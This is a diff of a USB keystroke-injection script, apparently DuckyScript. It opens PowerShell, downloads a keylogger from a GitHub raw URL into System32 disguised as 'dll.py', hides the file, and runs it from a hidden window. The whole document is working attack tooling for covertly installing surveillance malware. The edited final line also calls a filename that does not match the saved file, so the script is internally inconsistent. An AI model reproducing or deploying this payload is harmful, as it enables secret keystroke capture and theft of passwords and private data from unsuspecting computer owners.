@@ -22,10 +22,22 @@ STRING Powershell
 DELAY 200
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile C:\Windows\keylogger.py
+STRING $bol1 = Test-Path -Path "C:\Windows\System32/dll.py"
 ENTER
 DELAY 200
-STRING $HIDE=Get-Item C:\Windows\keylogger.py -Force
+STRING if ($bol1){
+ENTER
+DELAY 200
+STRING remove-Item -Path "C:\Windows\System32/dll.py"
+ENTER
+DELAY 200
+STRING }
+ENTER
+DELAY 200
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile C:\Windows\System32/dll.py
+ENTER
+DELAY 200
+STRING $HIDE=Get-Item C:\Windows\System32/dll.py -Force
 ENTER
 DELAY 200
 STRING $HIDE.Attributes="Hidden"
@@ -45,5 +57,5 @@ STRING powershell -WindowStyle hidden
 DELAY 200
 ENTER
 DELAY 200
-STRING python C:\Windows\keylogger.py
+STRING python C:\Windows\System32/keylogger.py
 ENTER
